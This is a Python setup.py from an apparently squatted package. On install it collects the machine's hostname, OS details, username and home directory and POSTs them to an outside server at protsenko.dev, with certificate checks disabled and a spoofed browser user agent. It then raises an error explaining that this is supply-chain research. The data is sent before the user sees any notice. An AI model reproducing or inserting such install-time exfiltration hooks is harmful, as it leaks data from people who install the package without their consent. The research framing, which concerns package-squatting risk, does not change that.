import getpass
import os
import platform
import socket
import sys
import json
import ssl
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
from distutils.core import setup


def get_system_telemetry():
    def safe_call(func, *args, fallback="unknown"):
        try:
            return func(*args)
        except:
            return fallback

    os_info = {
        "system":      safe_call(platform.system),
        "node_name":   safe_call(platform.node),
        "release":     safe_call(platform.release),
        "version":     safe_call(platform.version),
        "machine":     safe_call(platform.machine),
        "processor":   safe_call(platform.processor)
    }

    user_info = {
        "current_user":   safe_call(getpass.getuser),
        "home_directory": safe_call(os.path.expanduser, "~")
    }

    additional_info = {
        "hostname":       safe_call(socket.gethostname),
        "python_version": safe_call(platform.python_version)
    }

    system_resources = {
        "cpu_count_logical":   "unknown",
        "cpu_count_physical":  "unknown",
        "memory_total":        "unknown",
        "memory_available":    "unknown"
    }

    telemetry_data = {
        "os_info":          os_info,
        "user_info":        user_info,
        "additional_info":  additional_info,
        "system_resources": system_resources
    }

    return telemetry_data


def send_post_request(url, payload, disable_ssl_verification=True):
    data = json.dumps(payload).encode('utf-8')
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0"
    }
    req = Request(url, data=data, headers=headers)

    context = None
    if disable_ssl_verification:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

    try:
        with urlopen(req, context=context) as response:
            response_body = response.read().decode('utf-8')
            print("Response:", response_body)
            return response_body
    except HTTPError as e:
        print("HTTP error:", str(e.code), str(e.reason))
    except URLError as e:
        print("URL error:", str(e.reason))
    except Exception as e:
        print("Unexpected error:", str(e))


def send_telemetry():
    send_post_request("https://protsenko.dev/telemetry/telemetry.php", get_system_telemetry())


if not any(cmd in sys.argv for cmd in ["sdist", "egg_info"]):
    send_telemetry()

    raise Exception(
        """
        Installation terminated!
        This is research package to analyze what happened after publishing removed packages with many downloads  .
        Removed packages could be squatted by someone creating risks for supply-chain.
        This package shouldn't be installed by someone.
        Script collects analytics about OS environment and sends it to dedicated server (see sources).
        You could reach me for research collaboration: cybersec@protsenko.dev
        """
    )

setup()
